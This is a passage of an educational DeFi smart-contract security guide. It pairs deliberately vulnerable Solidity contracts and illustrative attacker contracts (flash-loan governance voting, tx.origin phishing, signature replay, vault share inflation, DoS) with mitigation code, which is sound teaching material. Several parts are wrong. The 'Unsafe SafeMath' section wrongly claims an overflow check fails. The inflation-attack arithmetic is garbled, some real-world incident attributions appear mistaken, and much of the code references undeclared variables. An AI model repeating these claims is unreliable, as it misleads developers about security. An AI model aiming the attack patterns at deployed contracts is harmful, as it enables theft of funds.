- Monitor for transaction pairs with similar parameters
- Track price impacts and spreads
- Analyze transaction ordering in blocks
- Monitor MEV dashboards
- Look for rapid buy/sell sequences
- Verify slippage patterns

---

## Price Manipulation

### How It Works

Attackers artificially move asset prices to profit:
- Pump prices then sell
- Dump prices then buy
- Exploit price-based liquidations
- Manipulate collateral values

### Real-World Examples

- **Luna-Terra Collapse**: Billions from price manipulation
- **Squid Game Rug Pull**: Pump-and-dump attack
- **Titan Token**: $40 million from death spiral
- **Iron Finance**: Algorithmic stablecoin collapse

### Code Examples

#### Pump and Dump Attack

```solidity
// VULNERABLE: Price-dependent logic
pragma solidity ^0.8.0;

contract VulnerableToken {
    uint256 public price;
    mapping(address => uint256) public balances;

    function updatePrice(uint256 newPrice) external {
        price = newPrice; // Any external caller can update
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender] * price; // Inflatable value
    }
}

contract PumpAndDumpAttacker {
    VulnerableToken public token;
    uint256 public initialInvestment = 100 ether;

    function attack() external {
        // Step 1: Pump the price
        token.updatePrice(1000e18); // Increase price 10x

        // Step 2: Contracts using token.price() now think tokens are valuable
        // Users buy in at inflated price

        // Step 3: Attacker dumps
        token.updatePrice(1e18); // Back to real price

        // Step 4: Profit from price difference
    }
}
```

#### Price-Based Liquidation Exploitation

```solidity
// VULNERABLE: Liquidation based on manipulable price
pragma solidity ^0.8.0;

contract VulnerableLendingPool {
    IPriceOracle public oracle;
    mapping(address => uint256) public collateral;
    mapping(address => uint256) public borrowed;

    function liquidate(address borrower) external {
        uint256 collateralValue = (collateral[borrower] * oracle.getPrice()) / 1e18;
        uint256 borrowedValue = borrowed[borrower];

        if (collateralValue < borrowedValue) {
            // VULNERABILITY: Price is manipulated, liquidation unfair
            _seizeCollateral(borrower);
        }
    }
}

contract PriceLiquidationAttacker {
    VulnerableLendingPool public pool;
    IPriceOracle public oracle;

    function exploitLiquidation(address victim) external {
        // Step 1: Attacker manipulates price down
        oracle.setPrice(1); // Crash price

        // Step 2: Victim becomes liquidatable
        pool.liquidate(victim);

        // Step 3: Attacker buys victim's collateral at discount

        // Step 4: Restore price, sell for profit
    }
}
```

### Mitigation Strategies

1. **Robust Price Feeds**
   ```solidity
   pragma solidity ^0.8.0;

   contract RobustOracle {
       AggregatorV3Interface public chainlink;
       IUniswapV2Pair public uniswap;
       IBandOracle public band;

       function getSafePrice() external view returns (uint256) {
           uint256 clPrice = getChainlinkPrice();
           uint256 uniPrice = getUniswapTWAP();
           uint256 bandPrice = getBandPrice();

           // Verify prices are consistent
           _validatePriceConsistency(clPrice, uniPrice, bandPrice);

           return _median(clPrice, uniPrice, bandPrice);
       }

       function _validatePriceConsistency(
           uint256 a, uint256 b, uint256 c
       ) internal pure {
           uint256 max = _max(a, _max(b, c));
           uint256 min = _min(a, _min(b, c));

           // Prices shouldn't diverge more than 5%
           require(max <= min * 105 / 100, "Price divergence");
       }

       function _median(uint256 a, uint256 b, uint256 c)
           internal pure returns (uint256) {
           if (a >= b) {
               if (b >= c) return b;
               if (a >= c) return c;
               return a;
           } else {
               if (a >= c) return a;
               if (b >= c) return c;
               return b;
           }
       }
   }
   ```

2. **Circuit Breakers**
   ```solidity
   pragma solidity ^0.8.0;

   contract CircuitBreakerProtection {
       uint256 public lastPrice;
       uint256 public maxPriceChange = 100; // 1% max change per block
       uint256 public lastUpdateBlock;

       function updatePrice(uint256 newPrice) external {
           require(block.number > lastUpdateBlock, "Already updated this block");

           if (lastPrice > 0) {
               uint256 percentChange = (newPrice * 10000) / lastPrice;
               require(
                   percentChange >= 9900 && percentChange <= 10100,
                   "Price change too large"
               );
           }

           lastPrice = newPrice;
           lastUpdateBlock = block.number;
       }
   }
   ```

3. **Liquidation Safeguards**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafeLiquidation {
       function liquidate(address borrower) external {
           require(isLiquidatable(borrower), "Not liquidatable");

           // Get price from multiple sources
           uint256 price = getSafePrice();

           // Check liquidation threshold with buffer
           uint256 healthFactor = getHealthFactor(borrower, price);
           require(healthFactor < 95, "Health factor too high"); // 95% = 5% buffer

           // Liquidate gradually to prevent cascade
           _liquidatePortion(borrower);
       }
   }
   ```

---

## Governance Attacks

### How It Works

Attackers exploit governance mechanisms to drain funds or take over protocols:
- Flash loan voting attacks
- Vote buying
- Governance token dilution
- Proposal manipulation
- Instant finality exploitation

### Real-World Examples

- **bZx Governance Attack**: $150,000 through voting exploit
- **Curve DAO Attack**: Governance token voting power manipulation
- **Binance Bridge Hack**: Governance vulnerability led to $600M loss
- **Compound Governance Exploit**: Flash loan voting attack

### Code Examples

#### Flash Loan Voting Attack

```solidity
// VULNERABLE: Voting power from token balance
pragma solidity ^0.8.0;

interface IGovernanceToken is IERC20 {
    function getPriorVotes(address account, uint256 blockNumber)
        external view returns (uint96);
}

contract VulnerableGovernance {
    IGovernanceToken public govToken;

    mapping(uint256 => Proposal) public proposals;
    uint256 public proposalCount;

    struct Proposal {
        uint256 forVotes;
        uint256 againstVotes;
        bool executed;
    }

    function castVote(uint256 proposalId, bool support) external {
        // VULNERABILITY: Uses current block balance for voting
        uint256 votes = govToken.balanceOf(msg.sender);

        if (support) {
            proposals[proposalId].forVotes += votes;
        } else {
            proposals[proposalId].againstVotes += votes;
        }
    }

    function executeProposal(uint256 proposalId) external {
        require(proposals[proposalId].forVotes > proposals[proposalId].againstVotes);
        proposals[proposalId].executed = true;

        // Transfer funds to attacker's proposal
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}

// Flash loan voting attack
contract FlashLoanVotingAttack {
    VulnerableGovernance public governance;
    IFlashLoanProvider public flashloan;
    IGovernanceToken public govToken;

    function executeAttack() external {
        // Step 1: Borrow governance tokens via flashloan
        flashloan.flashLoan(
            address(this),
            address(govToken),
            govToken.totalSupply() / 2, // Borrow half total supply
            abi.encode(address(governance))
        );
    }

    function executeOperation(
        address,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata params
    ) external override returns (bytes32) {
        address governanceAddress = abi.decode(params, (address));
        VulnerableGovernance gov = VulnerableGovernance(governanceAddress);

        // Step 2: Vote with borrowed tokens
        gov.castVote(0, true); // Vote yes on attacker's proposal

        // Step 3: Execute proposal while still holding tokens
        gov.executeProposal(0); // Transfer funds to attacker

        // Step 4: Repay flashloan
        govToken.approve(msg.sender, amount + premium);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}
}
```

#### Vote Buying Attack

```solidity
// VULNERABLE: No snapshot of voting power
pragma solidity ^0.8.0;

contract VulnerableVotingPool {
    mapping(uint256 => uint256) public proposalVotes;
    mapping(address => uint256) public userTokens;

    function deposit(uint256 amount) external {
        userTokens[msg.sender] += amount;
        // No snapshot taken
    }

    function vote(uint256 proposalId, uint256 amount) external {
        // VULNERABILITY: Uses current balance, can be manipulated
        require(userTokens[msg.sender] >= amount);
        proposalVotes[proposalId] += amount;
    }

    function withdraw(uint256 amount) external {
        require(userTokens[msg.sender] >= amount);
        userTokens[msg.sender] -= amount;
        // Can withdraw after voting!
    }
}

// Vote buying attack
contract VoteBuyingAttack {
    VulnerableVotingPool public pool;

    function attack() external {
        // Step 1: Deposit tokens
        pool.deposit(1000e18);

        // Step 2: Vote on malicious proposal
        pool.vote(0, 1000e18);

        // Step 3: Immediately withdraw tokens
        pool.withdraw(1000e18);

        // Tokens can be used again in next governance cycle!
    }
}
```

### Mitigation Strategies

1. **Block Number Snapshots**
   ```solidity
   pragma solidity ^0.8.0;

   contract SecureGovernance {
       struct Proposal {
           uint256 startBlock;
           uint256 endBlock;
           uint256 forVotes;
           uint256 againstVotes;
           bool executed;
       }

       mapping(uint256 => Proposal) public proposals;
       mapping(uint256 => mapping(address => bool)) public hasVoted;

       IGovernanceToken public govToken;

       function propose() external returns (uint256) {
           uint256 proposalId = proposalCount++;
           proposals[proposalId].startBlock = block.number + 1;
           proposals[proposalId].endBlock = block.number + 50000; // ~1 week
           return proposalId;
       }

       function castVote(uint256 proposalId, bool support) external {
           require(!hasVoted[proposalId][msg.sender], "Already voted");
           require(block.number <= proposals[proposalId].endBlock, "Voting closed");

           // Use block number snapshot - can't be manipulated
           uint256 votes = govToken.getPriorVotes(
               msg.sender,
               proposals[proposalId].startBlock
           );

           hasVoted[proposalId][msg.sender] = true;

           if (support) {
               proposals[proposalId].forVotes += votes;
           } else {
               proposals[proposalId].againstVotes += votes;
           }
       }
   }
   ```

2. **Time-Locks on Execution**
   ```solidity
   pragma solidity ^0.8.0;

   contract TimeLockGovernance {
       uint256 constant TIMELOCK = 2 days;

       struct ScheduledAction {
           address target;
           bytes data;
           uint256 scheduledTime;
           bool executed;
       }

       mapping(bytes32 => ScheduledAction) public scheduledActions;

       function scheduleProposal(
           address target,
           bytes calldata data
       ) external onlyGovernance {
           bytes32 actionId = keccak256(abi.encodePacked(target, data));

           scheduledActions[actionId].target = target;
           scheduledActions[actionId].data = data;
           scheduledActions[actionId].scheduledTime = block.timestamp + TIMELOCK;
       }

       function executeProposal(bytes32 actionId) external {
           ScheduledAction storage action = scheduledActions[actionId];

           require(block.timestamp >= action.scheduledTime, "Timelock not passed");
           require(!action.executed, "Already executed");

           action.executed = true;

           (bool success, ) = action.target.call(action.data);
           require(success);
       }
   }
   ```

3. **Multi-Sig Oversight**
   ```solidity
   pragma solidity ^0.8.0;

   contract GovernanceWithMultisig {
       address[] public multisigOwners;
       uint256 public multisigThreshold;

       function executeProposal(bytes32 proposalId, bytes calldata data)
           external
           onlyGovernance
       {
           // Proposal must be approved by multisig before execution
           require(
               _hasMultisigApproval(proposalId),
               "Multisig approval required"
           );

           // Execute proposal
           (bool success, ) = address(this).call(data);
           require(success);
       }

       function _hasMultisigApproval(bytes32 proposalId)
           internal view returns (bool)
       {
           uint256 approvals = 0;
           for (uint256 i = 0; i < multisigOwners.length; i++) {
               if (isApprovedBy[proposalId][multisigOwners[i]]) {
                   approvals++;
               }
           }
           return approvals >= multisigThreshold;
       }
   }
   ```

---

## Signature Replay

### How It Works

Attackers reuse valid signatures to execute transactions multiple times:
- Same network replay
- Cross-chain replay
- Signature reuse across different functions

### Real-World Examples

- **Poly Network Hack**: Cross-chain signature replay ($611M)
- **Ronin Bridge**: Signature validation bypass ($625M)
- **Nomad Bridge**: Missing chain ID check ($190M)
- **EIP-712 replay attacks**: Various DeFi protocols

### Code Examples

#### Vulnerable Signature (No Nonce)

```solidity
// VULNERABLE: No nonce protection
pragma solidity ^0.8.0;

contract VulnerablePermit {
    mapping(address => uint256) public balances;

    // VULNERABILITY: No nonce, signature can be replayed
    function permitTransfer(
        address from,
        address to,
        uint256 amount,
        bytes calldata signature
    ) external {
        bytes32 hash = keccak256(
            abi.encodePacked(from, to, amount)
        );

        address signer = recoverSigner(hash, signature);
        require(signer == from, "Invalid signature");

        balances[from] -= amount;
        balances[to] += amount;
    }

    function recoverSigner(bytes32 hash, bytes calldata sig)
        internal pure returns (address)
    {
        // Signature recovery logic
        return msg.sender; // Simplified
    }
}

// Attacker replays signature multiple times
contract SignatureReplayAttacker {
    VulnerablePermit public token;

    function replaySignature(
        address from,
        address to,
        uint256 amount,
        bytes calldata signature
    ) external {
        // Can call permitTransfer multiple times with same signature!
        for (uint256 i = 0; i < 10; i++) {
            token.permitTransfer(from, to, amount, signature);
        }
    }
}
```

#### Cross-Chain Replay

```solidity
// VULNERABLE: No chain ID check
pragma solidity ^0.8.0;

contract VulnerableCrossChain {
    mapping(address => uint256) public nonces;

    // VULNERABILITY: Missing chainId in signature
    function executeTransaction(
        address target,
        bytes calldata data,
        uint256 nonce,
        bytes calldata signature
    ) external {
        bytes32 hash = keccak256(
            abi.encodePacked(target, data, nonce)
        );

        address signer = recoverSigner(hash, signature);
        require(nonces[signer] == nonce, "Invalid nonce");

        nonces[signer]++;

        (bool success, ) = target.call(data);
        require(success);
    }
}

// Cross-chain replay attack
contract CrossChainReplayAttack {
    address public mainnetContract;
    address public arbitrumContract;

    function replayAcrossChains(
        address target,
        bytes calldata data,
        uint256 nonce,
        bytes calldata signature
    ) external {
        // Same signature works on both chains!
        // Call on Arbitrum with signature meant for Mainnet
        IVulnerableCrossChain(arbitrumContract).executeTransaction(
            target, data, nonce, signature
        );
    }
}
```

### Mitigation Strategies

1. **Nonce-Based Protection**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafePermit {
       mapping(address => uint256) public nonces;
       mapping(address => uint256) public balances;

       function permit(
           address owner,
           address spender,
           uint256 value,
           uint256 deadline,
           uint8 v,
           bytes32 r,
           bytes32 s
       ) external {
           require(block.timestamp <= deadline, "Signature expired");

           bytes32 digest = keccak256(
               abi.encodePacked(
                   "\x19\x01",
                   DOMAIN_SEPARATOR,
                   keccak256(
                       abi.encode(
                           PERMIT_TYPEHASH,
                           owner,
                           spender,
                           value,
                           nonces[owner]++, // Increment nonce
                           deadline
                       )
                   )
               )
           );

           address recoveredAddress = ecrecover(digest, v, r, s);
           require(recoveredAddress == owner, "Invalid signature");

           // Execute permit
       }
   }
   ```

2. **Chain ID in Signature**
   ```solidity
   pragma solidity ^0.8.0;

   contract ChainIDProtection {
       bytes32 public DOMAIN_SEPARATOR;

       constructor() {
           DOMAIN_SEPARATOR = keccak256(
               abi.encode(
                   keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                   keccak256(bytes("MyToken")),
                   keccak256(bytes("1")),
                   block.chainid, // Include chain ID
                   address(this)
               )
           );
       }

       function executeTransaction(
           address target,
           bytes calldata data,
           uint256 nonce,
           uint8 v,
           bytes32 r,
           bytes32 s
       ) external {
           bytes32 digest = keccak256(
               abi.encodePacked(
                   "\x19\x01",
                   DOMAIN_SEPARATOR, // Includes chainId
                   keccak256(abi.encode(target, data, nonce))
               )
           );

           address signer = ecrecover(digest, v, r, s);
           require(signer == msg.sender);

           (bool success, ) = target.call(data);
           require(success);
       }
   }
   ```

3. **Signature Expiration**
   ```solidity
   pragma solidity ^0.8.0;

   contract ExpiringSignature {
       mapping(bytes32 => bool) public usedSignatures;

       function executeWithExpiry(
           address target,
           bytes calldata data,
           uint256 deadline,
           bytes calldata signature
       ) external {
           require(block.timestamp <= deadline, "Signature expired");

           bytes32 hash = keccak256(
               abi.encodePacked(target, data, deadline)
           );

           require(!usedSignatures[hash], "Signature already used");
           usedSignatures[hash] = true;

           // Execute
       }
   }
   ```

---

## Integer Overflow/Underflow

### How It Works

In Solidity < 0.8.0, arithmetic operations could overflow/underflow silently. Attackers:
- Cause balances to wrap around
- Create infinite token supplies
- Drain contracts through bad math

### Real-World Examples

- **bEthereum Contract**: Integer overflow drained $225,000
- **PoWHC Ponzi**: Integer overflow vulnerability
- **SmartBillions Casino**: Integer underflow exploitation

### Code Examples

#### Vulnerable Arithmetic (Solidity < 0.8.0)

```solidity
// VULNERABLE: No overflow protection (Solidity 0.7.0 and below)
pragma solidity ^0.7.0;

contract VulnerableToken {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    function transfer(address to, uint256 amount) external {
        require(balances[msg.sender] >= amount);

        balances[msg.sender] -= amount; // Could underflow
        balances[to] += amount;          // Could overflow
    }

    function mint(uint256 amount) external {
        balances[msg.sender] += amount;
        totalSupply += amount;           // Could overflow
    }
}

// Attack
contract OverflowAttacker {
    VulnerableToken public token;

    function attack() external {
        // Send 1 token to someone
        token.transfer(address(this), 1);

        // Check balance - if user had 0, now has huge number!
        // 0 - 1 = 2^256 - 1 (max uint256)
    }
}
```

#### Unsafe SafeMath

```solidity
// VULNERABLE: Incorrect SafeMath implementation
pragma solidity ^0.8.0;

contract UnsafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Overflow"); // WRONG - this doesn't catch overflow!
        return c;
    }
}
```

### Mitigation Strategies

1. **Solidity 0.8.0+ (Built-in Overflow Protection)**
   ```solidity
   pragma solidity ^0.8.0;

   contract SafeToken {
       mapping(address => uint256) public balances;

       function transfer(address to, uint256 amount) external {
           require(balances[msg.sender] >= amount);

           // Automatic overflow/underflow checks in 0.8.0+
           balances[msg.sender] -= amount;
           balances[to] += amount;
       }
   }
   ```

2. **OpenZeppelin SafeMath (for 0.7.0 and below)**
   ```solidity
   pragma solidity ^0.7.0;

   import "@openzeppelin/contracts/math/SafeMath.sol";

   contract SafeToken {
       using SafeMath for uint256;
       mapping(address => uint256) public balances;

       function transfer(address to, uint256 amount) external {
           require(balances[msg.sender] >= amount);

           balances[msg.sender] = balances[msg.sender].sub(amount);
           balances[to] = balances[to].add(amount);
       }
   }
   ```

3. **Explicit Checks**
   ```solidity
   pragma solidity ^0.8.0;

   contract ExplicitChecks {
       function add(uint256 a, uint256 b) internal pure returns (uint256) {
           require(a + b >= a, "Overflow");
           return a + b;
       }

       function sub(uint256 a, uint256 b) internal pure returns (uint256) {
           require(b <= a, "Underflow");
           return a - b;
       }
   }
   ```

---

## Access Control Exploits

### How It Works

Weak access control allows unauthorized users to perform privileged functions:
- Missing permission checks
- Incorrectly implemented role-based access
- tx.origin usage instead of msg.sender
- Public functions should be internal

### Real-World Examples

- **Ronin Bridge**: Compromised private keys for validators
- **Cream Finance**: Permissioned function called by attacker
- **Compound Governor Bravo**: Votable proposal threshold bypass
- **Wormhole Bridge**: Validation bypass ($325M)

### Code Examples

#### Missing Access Control

```solidity
// VULNERABLE: No access control
pragma solidity ^0.8.0;

contract VulnerableVault {
    uint256 public totalSupply;
    mapping(address => uint256) public balances;

    // VULNERABILITY: Anyone can mint!
    function mint(address to, uint256 amount) external {
        balances[to] += amount;
        totalSupply += amount;
    }

    // VULNERABILITY: Anyone can withdraw all funds!
    function withdrawAll() external {
        uint256 balance = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success);
    }
}

// Attacker
contract AccessControlAttacker {
    VulnerableVault public vault;

    function attack() external {
        // Mint infinite tokens
        vault.mint(address(this), 1000000e18);

        // Withdraw all vault funds
        vault.withdrawAll();
    }
}
```

#### Incorrect Role-Based Access

```solidity
// VULNERABLE: Incorrect role checking
pragma solidity ^0.8.0;

contract VulnerableRoleControl {
    bytes32 constant ADMIN_ROLE = keccak256("ADMIN");
    mapping(address => mapping(bytes32 => bool)) public roles;

    // VULNERABILITY: No check of sender's role
    function grantRole(bytes32 role, address account) external {
        // Should check: require(roles[msg.sender][ADMIN_ROLE]);
        roles[account][role] = true;
    }

    function withdrawFunds() external {
        // Anyone can withdraw!
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success);
    }
}
```

#### tx.origin Usage

```solidity
// VULNERABLE: Uses tx.origin instead of msg.sender
pragma solidity ^0.8.0;

contract VulnerableTxOrigin {
    mapping(address => uint256) public balances;

    // VULNERABILITY: Uses tx.origin for authorization
    function withdraw(uint256 amount) external {
        require(tx.origin == owner, "Not owner"); // WRONG!

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
    }
}

// Phishing attack
contract PhishingContract {
    VulnerableTxOrigin public vault;

    receive() external payable {
        // When owner calls vault.withdraw(), tx.origin is the owner
        // But msg.sender is this contract
        // So this contract can steal funds!
        vault.withdraw(address(this).balance);
    }
}
```

### Mitigation Strategies

1. **OpenZeppelin AccessControl**
   ```solidity
   pragma solidity ^0.8.0;

   import "@openzeppelin/contracts/access/AccessControl.sol";

   contract SafeVault is AccessControl {
       bytes32 public constant ADMIN_ROLE = keccak256("ADMIN");
       bytes32 public constant MINTER_ROLE = keccak256("MINTER");

       constructor() {
           _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
       }

       function mint(address to, uint256 amount)
           external
           onlyRole(MINTER_ROLE)
       {
           // Protected by role-based access
           balances[to] += amount;
       }

       function withdrawFunds()
           external
           onlyRole(ADMIN_ROLE)
       {
           // Only admin can call
           (bool success, ) = msg.sender.call{value: address(this).balance}("");
           require(success);
       }
   }
   ```

2. **Owner-Based Access**
   ```solidity
   pragma solidity ^0.8.0;

   contract OwnerProtected {
       address public owner;

       modifier onlyOwner() {
           require(msg.sender == owner, "Not owner");
           _;
       }

       constructor() {
           owner = msg.sender;
       }

       function restrictedFunction() external onlyOwner {
           // Only owner can call
       }

       function transferOwnership(address newOwner) external onlyOwner {
           owner = newOwner;
       }
   }
   ```

3. **Use msg.sender, Not tx.origin**
   ```solidity
   pragma solidity ^0.8.0;

   contract ProperSenderCheck {
       mapping(address => uint256) public balances;
       address public owner;

       function withdraw(uint256 amount) external {
           // CORRECT: Use msg.sender
           require(msg.sender == owner);

           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }

       // WRONG - don't do this:
       // require(tx.origin == owner);
   }
   ```

---

## Denial of Service (DoS)

### How It Works

Attackers prevent contract functionality by:
- Reverting operations with carefully crafted inputs
- Consuming excessive gas
- Blocking functions with loops over unbounded arrays
- Exploitation of gas limits

### Real-World Examples

- **Ethereum 2.0 Deposit Contract**: Possible DoS vectors
- **Multiple AMM Contracts**: DoS via gas exhaustion
- **DEX Liquidity Pools**: Array iteration DoS

### Code Examples

#### Array Iteration DoS

```solidity
// VULNERABLE: Unbounded loop can run out of gas
pragma solidity ^0.8.0;

contract VulnerableDistribution {
    address[] public recipients;
    uint256 public distributionAmount;

    // VULNERABILITY: Adding to array without limit
    function addRecipient(address addr) external {
        recipients.push(addr);
    }

    // VULNERABILITY: Iterating over unbounded array
    function distribute() external {
        for (uint256 i = 0; i < recipients.length; i++) {
            (bool success, ) = recipients[i].call{
                value: distributionAmount
            }("");
            require(success);
        }
    }
}

// DoS attack
contract DoSAttacker {
    VulnerableDistribution public distrib;

    function attack() external {
        // Add millions of addresses
        for (uint256 i = 0; i < 10000; i++) {
            distrib.addRecipient(address(uint160(i)));
        }

        // Now distribute() will always run out of gas
        // No one can receive their tokens!
    }
}
```

#### Reverting External Call DoS

```solidity
// VULNERABLE: External call revert stops entire operation
pragma solidity ^0.8.0;

contract VulnerableWithdrawal {
    mapping(address => uint256) public balances;
    address[] public withdrawalQueue;

    function queueWithdrawal(address addr) external {
        withdrawalQueue.push(addr);
    }

    // VULNERABILITY: If any call reverts, entire tx reverts
    function processWithdrawals() external {
        for (uint256 i = 0; i < withdrawalQueue.length; i++) {
            uint256 amount = balances[withdrawalQueue[i]];
            balances[withdrawalQueue[i]] = 0;

            // If this reverts, all withdrawals fail
            (bool success, ) = withdrawalQueue[i].call{value: amount}("");
            require(success); // Blocks all withdrawals!
        }
    }
}

// DoS contract
contract DoSBlocker {
    receive() external payable {
        revert("Blocked!"); // Always revert
    }
}

// Attack
contract DoSAttackOrchestration {
    VulnerableWithdrawal public vault;
    DoSBlocker public blocker;

    function attack() external {
        // Queue the DoS blocker
        vault.queueWithdrawal(address(blocker));

        // Now processWithdrawals() will always fail
        // No one can withdraw!
    }
}
```

#### Expensive Operation DoS

```solidity
// VULNERABLE: External call that uses excessive gas
pragma solidity ^0.8.0;

contract ExpensiveOperation {
    uint256[] public data;

    function addData(uint256 x) external {
        data.push(x);
    }

    // VULNERABILITY: This gets more expensive as array grows
    function process() external {
        // If array has millions of elements, this costs billions of gas
        for (uint256 i = 0; i < data.length; i++) {
            data[i] *= 2;
        }
    }
}
```

### Mitigation Strategies

1. **Bounded Iteration with Pagination**
   ```solidity
   pragma solidity ^0.8.0;

   contract PaginatedDistribution {
       address[] public recipients;
       uint256 public distributionAmount;
       uint256 constant MAX_ITERATION = 100;

       function distribute(uint256 startIndex, uint256 endIndex) external {
           require(endIndex <= recipients.length);
           require(endIndex - startIndex <= MAX_ITERATION, "Too many iterations");

           for (uint256 i = startIndex; i < endIndex; i++) {
               (bool success, ) = recipients[i].call{
                   value: distributionAmount
               }("");
               // Don't revert if individual call fails
               // emit WithdrawalFailed(recipients[i]);
           }
       }
   }
   ```

2. **Graceful Revert Handling**
   ```solidity
   pragma solidity ^0.8.0;

   contract RobustWithdrawal {
       mapping(address => uint256) public balances;

       function withdraw(uint256 amount) external {
           require(balances[msg.sender] >= amount);
           balances[msg.sender] -= amount;

           // Use low-level call to prevent revert from blocking
           (bool success, ) = msg.sender.call{value: amount}("");

           if (!success) {
               // Instead of reverting, queue for later
               pendingWithdrawals[msg.sender] += amount;
               emit WithdrawalQueued(msg.sender, amount);
           }
       }

       function claimQueued() external {
           uint256 amount = pendingWithdrawals[msg.sender];
           pendingWithdrawals[msg.sender] = 0;
           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }
   }
   ```

3. **Pull over Push Pattern**
   ```solidity
   pragma solidity ^0.8.0;

   contract PullPattern {
       mapping(address => uint256) public balances;

       // Instead of pushing funds to users (which can fail)
       // Let users pull their funds

       function withdraw() external {
           uint256 amount = balances[msg.sender];
           balances[msg.sender] = 0;

           (bool success, ) = msg.sender.call{value: amount}("");
           require(success);
       }
   }
   ```

4. **Limit Array Sizes**
   ```solidity
   pragma solidity ^0.8.0;

   contract ArraySizeLimited {
       address[] public recipients;
       uint256 constant MAX_RECIPIENTS = 1000;

       function addRecipient(address addr) external {
           require(recipients.length < MAX_RECIPIENTS, "Too many recipients");
           recipients.push(addr);
       }
   }
   ```

---

## Vault Inflation Attacks

### How It Works

Attackers inflate share prices by donating tokens directly to vault, causing rounding errors:
1. Attacker donates tokens directly to vault (not via deposit)
2. Shares are worth more relative to vault assets
3. Early users get fewer shares for their deposit
4. Attacker exits with profit

### Real-World Examples

- **Balancer Exploit**: $500,000 via inflation attack
- **Yearn Finance Vault**: Share price manipulation
- **Curve Metapool**: Vault inflation issue
- **Reentrancy + Inflation**: Combined attacks

### Code Examples

#### Vulnerable Vault

```solidity
// VULNERABLE: Share price inflation attack
pragma solidity ^0.8.0;

contract VulnerableVault {
    IERC20 public asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function deposit(uint256 assets) external returns (uint256 shares) {
        // VULNERABILITY: Uses simple division (shares = assets)
        // Can be manipulated by direct transfers

        if (totalSupply == 0) {
            shares = assets; // 1:1 ratio at start
        } else {
            // VULNERABILITY: Division can be manipulated
            shares = (assets * totalSupply) / asset.balanceOf(address(this));
        }

        require(shares > 0, "Zero shares");

        asset.transferFrom(msg.sender, address(this), assets);
        balanceOf[msg.sender] += shares;
        totalSupply += shares;
    }

    function withdraw(uint256 shares) external returns (uint256 assets) {
        assets = (shares * asset.balanceOf(address(this))) / totalSupply;

        balanceOf[msg.sender] -= shares;
        totalSupply -= shares;

        asset.transfer(msg.sender, assets);
    }
}

// Inflation attack
contract InflationAttacker {
    VulnerableVault public vault;
    IERC20 public asset;

    function attack() external {
        // Step 1: Deposit 1 wei to get 1 share
        asset.approve(address(vault), 1);
        vault.deposit(1);

        // Step 2: Donate 1000 tokens directly (inflates share price)
        asset.transfer(address(vault), 1000e18);

        // Now 1 share is worth 1000 tokens!

        // Step 3: Victim deposits 1000 tokens
        // Gets (1000 * 1) / 1000001 = 0 shares (rounding down!)

        // Step 4: Attacker withdraws
        vault.withdraw(1);
        // Gets 1000 + (1000/1) = 2000 tokens profit!
    }
}
```

### Mitigation Strategies

1. **Initialization Protection**
   ```solidity
   pragma solidity ^0.8.0;

   contract InitializedVault {
       IERC20 public asset;
       uint256 public totalSupply;
       mapping(address => uint256) public balanceOf;
       bool private initialized;

       function deposit(uint256 assets) external returns (uint256 shares) {
           if (totalSupply == 0) {
               // PROTECTION: Mint minimum shares to prevent inflation
               require(assets >= 1e6, "Deposit too small on initialization");
               shares = assets - 1e6; // Burn some shares
               balanceOf[address(0)] += 1e6; // Dead shares
           } else {
               shares = (assets * totalSupply) / asset.balanceOf(address(this));
           }

           require(shares > 0, "Zero shares");

           asset.transferFrom(msg.sender, address(this), assets);
           balanceOf[msg.sender] += shares;
           totalSupply += shares;
       }
   }
   ```

2. **Minimum Shares and Assets**
   ```solidity
   pragma solidity ^0.8.0;

   contract MinimumProtectedVault {
       uint256 constant MIN_SHARE_AMOUNT = 1e6; // 1 million shares

       function deposit(uint256 assets) external returns (uint256 shares) {
           if (totalSupply == 0) {
               shares = assets * MIN_SHARE_AMOUNT / 1e18;
               require(shares >= MIN_SHARE_AMOUNT, "Deposit too small");
           } else {
               shares = (assets * totalSupply) / asset.balanceOf(address(this));
               require(shares > 0, "Zero shares");
           }

           asset.transferFrom(msg.sender, address(this), assets);
           balanceOf[msg.sender] += shares;
           totalSupply += shares;
       }
   }
   ```

3. **Virtual Offset**
   ```solidity
   pragma solidity ^0.8.0;

   contract VirtualOffsetVault {
       uint256 internal constant OFFSET = 1e6;

       function deposit(uint256 assets) external returns (uint256 shares) {
           // Add virtual offset to prevent price manipulation
           uint256 virtualAssets = asset.balanceOf(address(this)) + OFFSET;

           if (totalSupply == 0) {
               shares = assets;
           } else {
               // virtualAssets includes the offset
               shares = (assets * (totalSupply + OFFSET)) / virtualAssets;
           }

           asset.transferFrom(msg.sender, address(this), assets);
           balanceOf[msg.sender] += shares;
           totalSupply += shares;
       }
   }
   ```

4. **ERC4626 Standard (Recommended)**
   ```solidity
   pragma solidity ^0.8.0;

   import "@openzeppelin/contracts/token/ERC4626/ERC4626.sol";

   contract SafeVault is ERC4626 {
       constructor(IERC20 asset_) ERC4626(asset_) {}

       // ERC4626 includes built-in protection against inflation attacks
       // Uses standardized share calculation with safety checks
   }
   ```

---

## Summary: Best Practices for DeFi Security

### 1. Code Review Checklist
- [ ] Use Solidity 0.8.0 or higher (built-in overflow protection)
- [ ] Check for reentrancy vulnerabilities (use CEI pattern)
- [ ] Validate all external calls and return values
- [ ] Implement access control on privileged functions
- [ ] Use multiple price oracle sources (don't trust single source)
- [ ] Implement slippage protection on swaps
- [ ] Check for signature replay vulnerabilities (nonce, chainId)
- [ ] Validate input parameters and state assumptions
- [ ] Use SafeMath or rely on 0.8.0+ built-in checks
- [ ] Implement circuit breakers and pause mechanisms

### 2. Testing Strategy
